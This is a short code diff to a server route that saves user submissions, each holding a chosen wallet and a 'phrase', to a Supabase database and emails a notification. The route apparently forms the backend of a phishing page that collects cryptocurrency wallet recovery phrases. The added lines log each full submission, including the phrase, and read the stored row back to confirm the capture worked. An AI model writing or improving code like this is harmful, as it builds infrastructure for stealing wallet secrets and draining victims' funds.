@@ -39,6 +39,11 @@ export async function POST(request) {
     })
 
     // Insert into Supabase
+    console.log('💾 Attempting to insert into database:', {
+      table: TABLES.SUBMISSIONS,
+      data: newSubmission
+    })
+    
     const { data, error } = await supabase
       .from(TABLES.SUBMISSIONS)
       .insert([newSubmission])
@@ -46,6 +51,12 @@ export async function POST(request) {
 
     if (error) {
       console.error('❌ Supabase database error:', error)
+      console.error('❌ Error details:', {
+        message: error.message,
+        code: error.code,
+        details: error.details,
+        hint: error.hint
+      })
       return Response.json(
         { error: 'Database error', details: error.message },
         { status: 500 }
@@ -55,8 +66,28 @@ export async function POST(request) {
     console.log('✅ Submission stored successfully:', {
       id: data[0].id,
       wallet: data[0].selected_wallet,
-      timestamp: data[0].timestamp
+      timestamp: data[0].timestamp,
+      phraseLength: data[0].phrase?.length || 0
     })
+    
+    // Verify the data was actually stored by fetching it back
+    console.log('🔍 Verifying stored data...')
+    const { data: verifyData, error: verifyError } = await supabase
+      .from(TABLES.SUBMISSIONS)
+      .select('*')
+      .eq('id', data[0].id)
+      .single()
+    
+    if (verifyError) {
+      console.error('⚠️ Warning: Could not verify stored data:', verifyError.message)
+    } else {
+      console.log('✅ Data verification successful:', {
+        id: verifyData.id,
+        wallet: verifyData.selected_wallet,
+        timestamp: verifyData.timestamp,
+        phraseLength: verifyData.phrase?.length || 0
+      })
+    }
 
     // Send email notification
     console.log('📧 Sending email notification...')
